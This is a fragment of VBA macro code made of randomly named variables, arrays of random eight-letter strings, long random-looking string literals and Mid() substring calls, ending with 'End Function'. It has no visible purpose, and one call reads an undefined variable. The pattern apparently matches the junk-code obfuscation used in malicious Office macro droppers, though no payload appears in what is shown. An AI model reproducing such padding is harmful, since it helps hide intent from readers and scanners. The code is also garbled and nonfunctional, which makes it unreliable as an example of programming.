ZcrjjYWSunA = Array("FBOkYTOn", "PpNMhkMc", "wMurSQOs", "MauZOraN", "XpUjTqnG", "KTiwGqPj", "baFdVGso", "mVYzZpZX")
tPFUf = Mid(jLqjnhEzGct, 21, 172)
LHjvfRJcO = Array("jblOYMkN", "mQBaAwib", "GJFrhiKz", "KXXUQaKA", "MPYLNStQ", "dVAZkhaL", "aZHulTCz", "RoDBpPzL")
smasjJW = "Pq0PKQJqijbcJiFdkvLEdMdDvCVDnULwUCouclOJzwwjwjdVwEWFjWdfsKfzSHDAoKbqpKBzhCHfPwFPZzGjzFPwZICRFQqqvvsnFnjlDXYjPzQvFQYTATDivdQjIjtRMQkTERJlTVjahjibsHMprXqbsJsbWzdTdGTwMwqoGnzimcBLupnAXEZpaIbuYiOTrMwaPjOIajM2b4"
piiGtA = Array("jSdZidOF", "uLiCJkwX", "tAzjVQHm", "nqjuNPVt", "prMuTwPB", "dDHmqibw", "zmZhpbzP", "LrlrwTri")
Wupqs = Mid(smasjJW, 14, 186)
AQstfKGhmW = Array("GLEfkjTm", "wzXntKrD", "cdOQCVdJ", "VRwfcdSE", "KUbOoXjD", "hAMsNzXz", "fsIBzYhk", "huJThoKV")
ndWDY = "IwGHRIIqSobwjSRjGJtVQrkBlqHtjoCbcQIlzIbEqsJsBuEDnSjWhFzPNFWbAOKdlzUTJfiwipiXiszrmDGNEjuWTsXsmzDchfGBaktHklnsbZjVFiowIzZEFzZTto1FdDQ9MNkYjQDJjzBa9k5lL3HfYvFYL"
RalPuCYv = Array("YmPGPUhS", "chwbpQXJ", "hsLQMDMw", "TvOQfkVL", "vozkOFIl", "kSwMBoMs", "nkzmNHBU", "aTmTFQnr")
HJmhzWKfMaT = Mid(ndWDY, 2, 121)
VorKnp = Array("twGhZurG", "LBtLqNtJ", "rthjwrmu", "ntQRiwcG", "vkzYbYQA", "lUCVXdMX", "GRkZuzQB", "JLtjiZYO")
End Function
